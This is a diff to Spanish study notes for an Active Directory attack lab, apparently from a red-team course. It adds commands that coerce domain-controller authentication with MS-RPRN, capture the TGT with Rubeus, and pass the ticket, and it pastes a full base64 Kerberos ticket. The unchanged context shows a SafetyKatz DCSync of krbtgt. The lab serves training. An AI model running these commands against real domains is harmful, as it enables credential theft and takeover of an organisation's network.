@@ -1221,8 +1221,21 @@ Ahora desde esta misma CMD donde hemos ejecutado el rubeus con el ticket en base
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
 ```
 
-Ahora deberemos de escalar privilegios a *Enterprise Admin* necesitaremos forzar la autenticacion desde *mcorp-dc*
+Ahora deberemos de escalar privilegios a *Enterprise Admin* necesitaremos forzar la autenticacion desde *mcorp-dc*, desde la CMD de *appadmin*
+```shell
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:MCORP-DC$ /interval:5 /nowrap
+```
 
+Y en la maquina de estudiante forzaremos la autenticacion desde *mcorp-dc* a *dcorp-appsrv*
+```shell
+C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
+```
+
+Obteniendo el ticket en base64 de *mcorp-dc$*
+Y desde la CMD como administrador cargamos el ticket
+```shell
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket: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
+```
  
 
 
